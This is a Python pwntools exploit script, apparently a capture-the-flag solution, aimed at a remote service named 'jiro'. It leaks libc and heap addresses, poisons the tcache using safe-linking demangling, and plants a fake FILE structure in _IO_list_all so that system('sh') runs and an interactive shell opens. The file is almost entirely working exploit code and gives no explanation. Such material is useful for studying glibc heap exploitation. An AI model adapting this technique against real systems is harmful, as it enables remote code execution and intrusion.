#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./jiro --host 109.233.56.90 --port 11777
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './jiro')
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11777)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
set resolve-heap-via-heuristic force
set fork-follow-mode parent
b _IO_flush_all
continue
'''.format(**locals())
context.terminal = ['terminator', '--new-tab', '-e']

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
# Debuginfo:  Yes

io = start()

def read_menu():
    io.recvuntil(b'>> ')


def hire(name):
    io.sendline(b'1')
    io.recvuntil(b': ')
    io.sendline(name)
    io.recvuntil(b'>> ')
    io.sendline(b'3')
    io.recvuntil(b"ID: ")
    empid = int(io.recvline().decode().strip(), 16)
    read_menu()
    return empid

def show(empid, leak_name=0, leak_rewards=0):
    io.sendline(b'6')
    io.recvuntil(b': ')
    io.sendline(hex(empid)[2:].encode())
    io.recvuntil('[ EMPLOYEE CARD ]\n')
    io.recvuntil(b'Name: ')
    a = u64(io.recvline()[:-1].ljust(8, b'\x00'))
    io.recvuntil(b'Zarabotal: ')
    b = int(io.recvline().decode().strip())
    read_menu()
    if leak_name and leak_rewards:
        return a, b
    if leak_name:
        return a
    if leak_rewards:
        return b
    
def add_task(empid, task_reward, task_name):
    io.sendline(b'4')
    io.recvuntil(b': ')
    io.sendline(hex(empid)[2:].encode())
    io.recvuntil(b': ')
    io.sendline(str(task_reward).encode())
    io.recvuntil(b': ')
    io.sendline(task_name)
    io.recvuntil(b'Task ID: ')
    task_id = int(io.recvline().decode().strip())
    read_menu()
    return task_id

def close_task(task_id):
    io.sendline(b'5')
    io.recvuntil(b': ')
    io.sendline(str(task_id).encode())
    read_menu()

def edit_employee(empid, name):
    io.sendline(b'2')
    io.recvuntil(b': ')
    io.sendline(hex(empid)[2:].encode())
    io.recvuntil(b'name: ')
    io.sendline(name)
    io.recvuntil(b'>> ')
    io.sendline(b'B' * 8)
    read_menu()

def fire(empid):
    io.sendline(b'3')
    io.recvuntil(b'ID: ')
    io.sendline(hex(empid)[2:].encode())
    read_menu()

def demangle(leak):
    o2 = (leak >> 12) ^ leak
    return (o2 >> 24) ^ o2


# leak libc
read_menu()
empid = hire(b'A' * 0x700)
task_id = add_task(empid, 100001, b'B' * 0x30)
close_task(task_id)
leak_name, leak_rewards = show(empid, leak_name=1, leak_rewards=1)
libc_base = leak_name - 0x1dab20
print("LIBC_BASE: ", hex(libc_base))
heap_base = (leak_rewards << 12) - 0x1000
print("HEAP_BASE: ", hex(heap_base))
aligned_emp = hire(b'A' * 0x700)

# craft fake file to write addr of it to _IO_list_all
# Fake FILE *
fs = FileStructure()
fs.flags = b'  sh\x00\x00\x00\x00'
fs._IO_write_base = 0
fs._IO_write_ptr = 1
fs.chain = 0
fs._lock = heap_base + 0x3000
fs._wide_data = heap_base + 0x380
fs.vtable = libc_base + libc.sym['_IO_wfile_jumps']

# Fake _IO_wide_data
fake_io_wide_data = flat({
    0x18: 0,
    0x20: 0,
    0x30: 0,
    0xe0: heap_base + 0x468
}, filler=b'\x00', length=0xe8)

# Fake _wide_vtable
fake_wide_vtable = flat({
    0x68: libc_base + libc.sym['system'],
}, filler=b'\x00', length=0x70)

FSOP = bytes(fs) + fake_io_wide_data + fake_wide_vtable
hire(FSOP.ljust(0x700, b'\x00'))

# tcache p -> chunk in emp name size
# leak stack
first = hire(b'C' * 0x10)
second = hire(b'D' * 0x70)
task_id = add_task(first, 100001, b'B' * 0x10)
fire(second)
close_task(task_id)

heap_leak = show(first, leak_name=1)
addr = demangle(heap_leak)
ALIGNED_EMP_OFFSET = 0x1a00
edit_employee(first, p64((addr >> 12) ^ (heap_base + ALIGNED_EMP_OFFSET)))

hire(b'D' * 0x70)
hire(b'D' * 0x70)
emp = hire(p64(0x30) + p64(libc_base + libc.sym['_IO_list_all']))
FSOP_OFFSET = 0x1a70
edit_employee(aligned_emp, p64(heap_base + FSOP_OFFSET))
# pause()
io.sendline(b'8')

io.interactive()